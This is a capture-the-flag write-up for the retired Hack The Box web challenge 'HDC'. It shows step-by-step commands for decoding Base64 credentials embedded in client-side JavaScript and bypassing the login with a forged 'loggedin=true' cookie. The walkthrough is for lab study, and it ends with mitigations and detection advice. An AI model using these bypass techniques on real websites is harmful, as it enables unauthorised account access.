---
challenge: HDC
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, javascript, base64, client-side-auth, login-bypass]
---

# HDC — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired (31 Jul 2019). Reference writeup; not played on this profile.
> No real credentials or flag.

## TL;DR

The login validates credentials in JavaScript and stores them Base64-encoded in the script itself. Decoding them yields a valid user. Authentication is client-side only: editing the condition or the cookie is enough to get in. Inside there is an email with the flag.

## 1. Recon

```bash
nmap -Pn -sCV -p 80 <TARGET_IP>
curl -s http://<TARGET_IP>/ | head -50
curl -s http://<TARGET_IP>/login.php
```

The login page loads a custom script. Enumerate paths and static files:

```bash
feroxbuster -u http://<TARGET_IP> -x php,js,html
```

## 2. Credentials in JavaScript

```bash
curl -s http://<TARGET_IP>/js/login.js
grep -oE 'atob\("[^"]+"\)' login.js
```

The script compares the user and password against encoded values. `atob()` is Base64 decoding, not encryption:

```bash
echo '<BASE64_USER>' | base64 -d
echo '<BASE64_PASS>' | base64 -d
```

Do not publish the credentials. Try them on the form:

```bash
curl -s -c cookies.txt -d 'username=<USER>&password=<PASSWORD>' \
  http://<TARGET_IP>/login.php -L
```

## 3. Login bypass

If the form rejects them, the check is client-side. Options:

- Read the code and find the session variable (`loggedin`, `auth`, `admin`).
- Set the cookie or `localStorage` the frontend reads.
- Edit the condition in DevTools before submitting.
- Call the protected endpoint directly:

```bash
curl -s -b 'loggedin=true' http://<TARGET_IP>/dashboard.php
curl -s http://<TARGET_IP>/admin.php
```

The response should contain the panel, not a redirect to `login.php`. If it still redirects, the server also validates and you need the decoded credentials.

## 4. The email

Inside the panel there is an inbox or an email link. Review:

- `/mail.php`, `/inbox`, `/message?id=1`.
- The email HTML and attachments.
- Source code, in case the flag is in a comment.

```bash
curl -s -b 'loggedin=true' 'http://<TARGET_IP>/mail.php?id=1' | grep -i 'HTB{'
```

## 5. Common mistakes

- **`atob` returns binary** → not standard Base64; try URL-safe or strip spaces.
- **The cookie does not stick** → wrong name or domain; check `Set-Cookie`.
- **The panel redirects** → the session is server-validated; use the real credentials.
- **The email is empty** → try another `id` or the message list.
- **Testing only the visual login** → inspect JS and requests in DevTools.

## Lessons learned

- Base64 is not encryption: anyone with the code can decode it.
- Authentication must be validated server-side; a JavaScript condition protects nothing.
- Cookies and `localStorage` are part of the attack surface.
- A “private” panel may expose endpoints without a session.
- The flag may be in an email, not the main panel.

## Mitigations and detection

- Validate credentials in the backend and use signed sessions (`HttpOnly`, `Secure`, `SameSite`).
- Do not embed secrets or passwords in JavaScript.
- Protect every endpoint with authorisation, not just the view.
- Detection: `dashboard.php` access without a prior login, tampered cookies and `mail.php?id=` enumeration.
- Audit client code for `atob`, `btoa` and password comparisons.

MITRE: T1078, T1552.001, T1539.

## References

- <https://medium.com/bugdecoder/htb-hdc-web-challenge-write-up-897d26d7b068>
- <https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication>
- <https://developer.mozilla.org/en-US/docs/Web/API/atob>
